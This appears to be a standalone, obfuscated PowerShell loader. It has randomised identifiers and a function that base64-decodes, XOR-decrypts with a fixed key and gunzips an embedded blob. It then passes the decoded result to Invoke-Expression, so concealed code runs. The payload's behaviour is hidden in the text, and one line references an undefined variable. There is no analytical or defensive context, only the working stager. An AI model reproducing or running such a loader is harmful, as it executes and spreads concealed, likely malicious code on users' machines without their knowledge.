$sadnv1q5yf3xkb4 = [System.Text.Encoding]::ascii
function 6zmytlxn4easp73rwkv21iobug5  {param($dsevnpixb6gmjqa )
  $7nr8c3yxjshzakb = [System.Convert]::FromBase64String($dsevnpixb6gmjqa)
  $gqrfo526ws14vly= $sadnv1q5yf3xkb4.GetBytes("usn0bf64pd2w")
    $26bfpslwkotnq1m = $7nr8c3yxjshzakb
    $yh3fapltk2nqo5x = $(for ($3tyg4xbon9s58kw = 0; $3tyg4xbon9s58kw -lt $26bfpslwkotnq1m.length; ) {
        for ($o18hjit5yds6an3 = 0; $o18hjit5yds6an3 -lt $gqrfo526ws14vly.length; $o18hjit5yds6an3++) {
            $26bfpslwkotnq1m[$3tyg4xbon9s58kw] -bxor $gqrfo526ws14vly[$o18hjit5yds6an3]
            $3tyg4xbon9s58kw++
            if ($3tyg4xbon9s58kw -ge $26bfpslwkotnq1m.Length) {
                $o18hjit5yds6an3 = $gqrfo526ws14vly.length
            }
        }
    })
	$18uptdc7snqbwj3 = New-Object System.IO.MemoryStream( , $yh3fapltk2nqo5x )

	    $eaj37l8qtx6nwo1 = New-Object System.IO.MemoryStream
        $bnarqi7jdv1c2xg = New-Object System.IO.Compression.GzipStream $18uptdc7snqbwj3, ([IO.Compression.CompressionMode]::Decompress)
	    $bnarqi7jdv1c2xg.CopyTo( $eaj37l8qtx6nwo1 )
        $bnarqi7jdv1c2xg.Close()
		$18uptdc7snqbwj3.Close()
		[byte[]] $qowlyje46p2na0t = $eaj37l8qtx6nwo1.ToArray()
 $uptv7osx5rwyhc1=$qowlyje46p2na0t
    return $uptv7osx5rwyhc1
}
[byte[]]$eb3hnfkvgztliyd=6zmytlxn4easp73rwkv21iobug5 $3zsaox8k0qin9be
[System.Text.Encoding]::ascii.GetString((6zmytlxn4easp73rwkv21iobug5 "avhmMGJmNjR0ZL8iGBzNCHKYSnyMY/m93JfcELDC61rbGnrFwb4w44ktQo8HvViS9XAg8NLQf3YLnd1Aydcj+RxOfrS3h1XpDBUCRC/hTaICM4PvVprf6fbDaL6g15xWzWFMeAZSCEYBhkTFgC9ofwZXy7RqdWc2mUYln+RCSC6IYK/UvDBIJe/KB2lbr9MZmUKAD/z4JN1CAm8loLx6pWRorwOD5xvQzeo9+DO+Oi1lSgCeOvf3DJPUVr3rcatVIf6kSyBYHjVmB9lA/Yr8Omd4IRb+nnallh2LYiUJYD0e0i5s8rS9aUCl4xYmmFVMDwyoS7JzFifZe6JZdUbiaU4mtLq6mNwNb4AhwooCh7Zpnz6aLL4+3dPXdP4Nca7WU6n/nCbr7ROx+JvUueCptBVM4o7FJJ/djPE4xwjT6NSPLqU+6JxNAsUNFoZ1++Y2ahjuhZfL4O+JxmuBQYKHjkSxcyIL6LlXjtG6oh3dUMdKyAxAMITQqBXMz+reuBzejxKZGcosM0txsYf6iwXRPtsyEjgFiYvrrc4lKD8NPvbNvYv2uQqiCFBqTenBSTnp6unGtW4CmY+dGE6jrv3hu5MhLsv35JoOensftK4nqkb1vrV/mczN1+t9JsWonIMe1zHr9k5HHHSX3HOOh+dKuSVyz2q2o4hhWE9oxU36SB+MuaIm20vn2JunHLzVXlpqLQcjPxYr5hwuNqH299vuK1nF7dsPPLsbYjgtlkIot4H9tPChZjgeDt90huS8dVOGwWCe6QCPCZ3gAWyie6VWnpZh3DvgRy59f7tOw1SpN9NxVACIUxIkx1L2j5lXrsUB2wbPiIkz3/VHlQ4E6VZ6qSYsLHmzaNPdVvUR8XNyE7Y6bXfDWysmVVPl+UAdNqmK4lZdQOKgR+I6dGX6lrwiYDWjFAc6/i0n0HcAMmK8o5oETL7Ouebf5N8Vrl/9pdXCe8uCKIglNYuOaMLgtOPh6tRbjEdOO8TMYmTTkR/bRBvfmE3JeJ1yxxTYLsEMn+jOysDpx5C9o4uKt6tMQj2xLpcwWMPWW46z2pTXnkeXvD5ptAIz6d2iEbLcI0Vyw0DB2HOoCW0eF8d2/BOb2WBIsMotmZTAS/e2jMaDtP8qxH+n4k5uWtuXBQDF3PPi76ldX3k+O6RHIjwNAY4EjXBWiMIdI0VQTGMnte2e42oGmS2Et5014GjA6P7K6qUXwdsI8pWV+j1hNjQ="))|iex;